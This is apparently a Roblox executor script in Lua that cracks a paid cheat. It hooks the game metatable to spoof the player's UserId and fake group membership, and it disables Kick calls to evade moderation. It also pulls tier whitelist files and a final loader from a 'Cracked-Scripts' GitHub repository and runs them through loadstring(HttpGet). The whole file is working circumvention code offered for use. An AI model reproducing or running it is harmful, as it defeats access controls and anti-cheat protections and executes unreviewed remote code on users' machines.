local spoofedUserId = 4163889872
local Players = game:GetService("Players")
local lp = Players.LocalPlayer
local whitelistedUserId = lp.UserId

local mt = getrawmetatable(game)
setreadonly(mt, false)
local oldIndex = mt.__index
mt.__index = newcclosure(function(t, k)
    if k == "IsInGroup" then
        return function() return true end
    end
    if t == lp and k == "UserId" then
        return spoofedUserId
    end
    return oldIndex(t, k)
end)
setreadonly(mt, true)

local function whitelistSelf()
    local mt2 = getrawmetatable(game)
    setreadonly(mt2, false)
    local oldIndex2 = mt2.__index
    mt2.__index = newcclosure(function(t, k)
        if t == lp and k == "UserId" then
            return whitelistedUserId
        end
        return oldIndex2(t, k)
    end)
    setreadonly(mt2, true)
end

whitelistSelf()

wait(1)

local function bypassTiers()
    local tiers = {
        "https://raw.githubusercontent.com/EncryptedV10/Cracked-Scripts/refs/heads/main/Los%20xd/tier2.lua",
        "https://raw.githubusercontent.com/EncryptedV10/Cracked-Scripts/refs/heads/main/Los%20xd/tier3.lua"
    }
    
    for _, url in ipairs(tiers) do
        local success, result = pcall(function()
            local tierUsers = loadstring(game:HttpGet(url))()
            if tierUsers then
                table.insert(tierUsers, spoofedUserId)
                local oldIndex2 = getrawmetatable(game).__index
                setreadonly(getrawmetatable(game), false)
                getrawmetatable(game).__index = newcclosure(function(t, k)
                    if k == "UserId" then
                        return spoofedUserId
                    end
                    return oldIndex2(t, k)
                end)
                setreadonly(getrawmetatable(game), true)
            end
        end)
        
        if not success then
            warn("Error loading tier data from: " .. url)
        end
    end
end

bypassTiers()

wait(1)

local playerMT = getrawmetatable(lp)
setreadonly(playerMT, false)
local oldIndex3 = playerMT.__index
local oldNamecall = playerMT.__namecall

playerMT.__index = newcclosure(function(t, k)
    if k == "Kick" then
        return function() end
    end
    return oldIndex3(t, k)
end)

playerMT.__namecall = newcclosure(function(self, ...)
    local method = getnamecallmethod()
    if method == "Kick" then
        return
    end
    return oldNamecall(self, ...)
end)

setreadonly(playerMT, true)

local function safeLoadString(url)
    local success, result = pcall(function()
        loadstring(game:HttpGet(url))()
    end)
    if not success then
        warn("Error loading script: " .. result)
    end
end

safeLoadString("https://raw.githubusercontent.com/EncryptedV10/Cracked-Scripts/refs/heads/main/Los%20xd/loader.lua")
